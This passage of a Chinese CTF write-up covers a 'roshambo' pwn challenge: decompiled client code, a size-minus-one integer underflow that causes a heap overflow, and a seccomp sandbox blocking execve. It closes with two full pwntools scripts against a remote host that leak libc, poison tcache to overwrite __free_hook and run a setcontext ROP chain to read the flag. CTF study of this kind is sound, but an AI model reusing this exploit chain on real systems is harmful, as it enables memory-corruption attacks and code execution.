      char s; // [rsp+10h] [rbp-1010h]
      size_t nbytes; // [rsp+20h] [rbp-1000h]
      __int64 v4; // [rsp+48h] [rbp-FD8h]
      unsigned __int64 v5; // [rsp+1018h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      memset(&s, 0, 0x1000uLL);
      while ( !mode_is_L || mode_is_L == 1 )
      {
        read(file_file[mode_is_L == 0], &s, 0x38uLL);
        read(file_file[mode_is_L == 0], &v4, nbytes);
        v1 = cmp_with__RPC_(&s);
        if ( v1 )
          play_game((__int64)&s);
        memset(&s, 0, 0x1000uLL);
        sleep(1u);
      }
      quit();
    }
类比成一个最长为0x1000 bytes的数据包，格式如下：
        +--------+--------+----------+--------+----------+
    |    8   |   8    |     8    |   32   | name_len |
    +--------+--------+----------+--------+----------+
    | status | option | name_len | sha256 |   name   |
    +--------+--------+----------+--------+----------+
    status： "[RPC]"  or  "EXIT"
    option:  [1 - 8]
只有在`status`为”[RPC]”，另一个client才会做出相应的动作，而至于`name_Len`开始的位置，后续基本没有用到，可以不用管；对于`option`，关注`client`函数中的相应逻辑，重点关注`case
8`：
        void sub_2424()
    {
      unsigned int v0; // eax
      unsigned int v1; // eax
      unsigned int size; // [rsp+4h] [rbp-Ch]
      char *size_4; // [rsp+8h] [rbp-8h]
      size_4 = (char *)malloc(0x1000uLL);
      memset(size_4, 0, 0x1000uLL);
      sleep(1u);
      printf("%s >> ", &name_str[32 * mode_is_L]);
      read(0, size_4, 0x1000uLL);
      if ( !strncmp(size_4, "EXIT", 4uLL) )
        exit(0);
      if ( *((_QWORD *)size_4 + 1) != 8LL || game_status != 1 )
      {
        switch ( *((_QWORD *)size_4 + 1) )
        {
          case 1LL:
            if ( !game_status_remote )
            {
              strcpy(size_4 + 56, (const char *)&name_str[32 * mode_is_L]);
              *((_QWORD *)size_4 + 2) = strlen((const char *)&name_str[32 * mode_is_L]);
              sha256((__int64)(size_4 + 24), (__int64)(size_4 + 56), *((_QWORD *)size_4 + 2));
              break;
            }
            return;
          case 3LL:
            print_info((__int64)&name_str[32 * mode_is_L], (__int64)(size_4 + 56));
            break;
          case 4LL:
            if ( game_status == 1 )
            {
              puts("Game is starting..");
            }
            else
            {
              game_status = 1;
              puts("Game start!");
              game_status_remote = 1;
            }
            break;
          case 5LL:
            if ( game_status_remote != 1 || game_status != 1 )
              return;
            prepared[mode_is_L] = 1;
            printf(">> You choose %s\n", &aRock[16 * prepared[mode_is_L] - 16]);
            ++play_times;
            if ( prepared[mode_is_L == 0] )
              play();
            else
              game_status_remote = 2;
            break;
          case 6LL:
            if ( game_status_remote != 1 || game_status != 1 )
              return;
            prepared[mode_is_L] = 2;
            printf(">> You choose %s\n", &aRock[16 * prepared[mode_is_L] - 16]);
            ++play_times;
            if ( prepared[mode_is_L == 0] )
              play();
            else
              game_status_remote = 2;
            break;
          case 7LL:
            if ( game_status_remote != 1 || game_status != 1 )
              return;
            prepared[mode_is_L] = 3;
            printf(">> You choose %s\n", &aRock[16 * prepared[mode_is_L] - 16]);
            ++play_times;
            if ( prepared[mode_is_L == 0] )
              play();
            else
              game_status_remote = 2;
            break;
          default:
            break;
        }
        v1 = get_length((__int64)size_4);
        write(file_file[mode_is_L], size_4, v1);
        free(size_4);
      }
      else
      {
        print_game_result();
        v0 = get_length((__int64)size_4);
        write(file_file[mode_is_L], size_4, v0);
        free(size_4);
        printf("size: ");
        size = read_n();
        if ( size > 0x100 )
        {
          puts("Too big!");
          exit(-1);
        }
        ptr = malloc(size);
        printf("what do you want to say? ");
        read(0, ptr, size - 1);
        printf("leave: %s", ptr);
        free(ptr);
      }
    }
可以看到`case 8`就是结束游戏，然后留言的功能，进入这个case的前提是游戏已经开始过。
  2. 同时还要注意的是，存在一个sandbox，禁用了`execve`，那么只能orw了：
  3. 理清逻辑之后，可以开始利用了。关键在于这个`case 8`，接受size的时候，只检查`size > 0x100`，而当`size = 0`的时候，`malloc`会分配0x20 bytes，而注意到`read(0, ptr, size - 1);`，size – 1造成负整数溢出，从而这里存在一个堆溢出。
  4. 知道这一点之后就很简单了，利用heap overflow伪造unsorted bin，利用unsorted bin来leak libc；再tcache poisoning，分配`__free_hook`就能改了；之后就是常规套路，改`__free_hook`为`setcontext + 53`的同时，布置好rop即可；最后触发free的时候就读到flag了：
  5. 不过从这个flag来看，最后感觉是不是非预期了啊，确实很多东西都没用到。不过还有一个存在漏洞的点，就是`recv_client`： 
        void __fastcall sub_15CE(__int64 a1)
    {
      unsigned int size; // [rsp+1Ch] [rbp-4h]
      switch ( *(_QWORD *)(a1 + 8) )
      {
        case 1LL:
          if ( (unsigned int)check_hash(a1) )
          {
            printf("[Enter Game] Player Name: %s \n\n", a1 + 56);
            strncpy((char *)&name_str[32 * (mode_is_L == 0)], (const char *)(a1 + 56), 0x20uLL);
            add_player_info();
          }
          break;
        case 2LL:
          if ( (unsigned int)check_hash(a1) )
          {
            printf("[Enter Game] Player Name: %s \n\n", a1 + 56);
            strncpy((char *)&name_str[32 * (mode_is_L == 0)], (const char *)(a1 + 56), 0x20uLL);
          }
          break;
        case 3LL:
          if ( *(_QWORD *)(a1 + 16)  0x100 )
          {
            puts("Too big!");
            exit(-1);
          }
          ptr = malloc(size);
          memset(ptr, 0, size);
          printf("what do you want to say? ");
          read(0, ptr, size - 1);
          printf("leave: %s", ptr);
          free(ptr);
          break;
        default:
          return;
      }
    }
在`case 3`这里，先是分配了一个chunk给了`ptr`，这与`case
8`中的`ptr`是一致的，同时这里在`free`之前还`sleep(2)`，也就是说，在这2s之内，如果另一个线程`client`也分配了一个chunk写入`ptr`，那么这里就有一个tcache
double free。（这里没有验证过，有兴趣的可以自行尝试）
  6. exp 
         '''pwn_roshambo_C.py'''
     from pwn import *
     p = remote('81.68.174.63', 64681)
     libc = ELF("./libc.so.6")
     main_arena_offset = 0x3ec0d0
     __free_hook_offset = libc.symbols["__free_hook"]
     setcontext_offset = libc.sym['setcontext']
     context.log_level = 'debug'
     context.arch = 'amd64'
     def start(auth, name):
         p.sendlineafter('Your Mode: ', 'C')
         p.sendlineafter("Authorization: ", auth)
         p.sendlineafter("Your Name: ", name)
     def choose(status, case, name_len=0, hash_data="", name="", token=" >> "):
         payload = status.ljust(8, "\x00") + p64(case)
         if name_len != 0:
             payload += p64(name_len) + hash_data + name
         p.sendlineafter(token, payload)
     def say(size, content):
         p.sendlineafter("size: ", str(size))
         p.sendlineafter("what do you want to say? ", content)
     start('123', '123')
     choose('[RPC]', 8, token="Game start!")
     say(0x18, 'test')
     choose('[RPC]', 8, token="Game start!")
     say(0xF8, 'test')
     choose('[RPC]', 8, token="Game start!")
     say(0x28, 'test')
     choose('[RPC]', 8, token="Game start!")
     say(0x0, "A" * 0x118 + p64(0x501))   # unsorted bin
     choose('[RPC]', 8, 0x700, '', (p64(0x21) + p64(0)) * 0x65, token="Game start!")
     say(0x28, "AAAA")  # free unsorted bin
     choose('[RPC]', 8, token="Game start!")
     say(0x0, "A" * 0x117 + "libcaddr")   # leak
     p.recvuntil("libcaddr\n")
     main_arena = u64(p.recv(6).ljust(8, "\x00"))
     libc_base = main_arena - main_arena_offset
     __free_hook = libc_base + __free_hook_offset
     libc_setcontext = libc_base + setcontext_offset
     # tcahe poisoning
     choose('[RPC]', 8, token="Game start!")
     say(0, "A" * 0x18 + p64(0xF1) + p64(__free_hook))   
     choose('[RPC]', 8, token="Game start!")
     say(0xF8, "AAAA")   
     # orw
     pop_rdi = libc_base + 0x000000000002155f # pop rdi ; ret
     pop_rsi = libc_base + 0x0000000000023e6a # pop rsi ; ret
     pop_rdx = libc_base + 0x0000000000001b96 # pop rdx ; ret
     libc_open = libc_base + libc.sym['open']
     libc_read = libc_base + libc.sym['read']
     libc_write = libc_base + libc.sym['write']
     payload = p64(libc_setcontext + 53)
     payload += flat([__free_hook + 0xB0, pop_rsi, 0, libc_open]) # 0x20
     payload += flat([pop_rdi, 5, pop_rsi, __free_hook + 0xC0, pop_rdx, 0x30, libc_read]) # 0x38
     payload += flat([pop_rdi, 1, pop_rsi, __free_hook + 0xC0, pop_rdx, 0x30, libc_write]) # 0x38
     payload += p64(0)
     payload += flat([__free_hook + 8, pop_rdi])
     payload += 'flag\x00'
     choose('[RPC]', 8, token="Game start!")
     say(0xF8, payload)  
     success("libc_base: " + hex(libc_base))
     p.interactive()
     '''pwn_roshambo_L.py'''
     from pwn import *
     p = remote('81.68.174.63', 64681)
     context.log_level = 'debug'
     def start(room, name):
         p.sendlineafter('Your Mode: ', 'L')
         p.sendlineafter("Your room: ", room)
         p.sendlineafter("Your Name: ", name)
     def choose(status, case, name_len=0, hash_data="", name=""):
         payload = status.ljust(8, "\x00") + p64(case)
         if name_len != 0:
             payload += p64(name_len) + hash_data + name
         p.sendlineafter(" >> ", payload)
     def say(size, content):
         p.sendlineafter("size: ", str(size))
         p.sendlineafter("what do you want to say? ", content)
     start(sys.argv[1], '123')
     for i in range(10):
         choose('[RPC]', 4)
         say(0x18, 'test')
     p.interactive()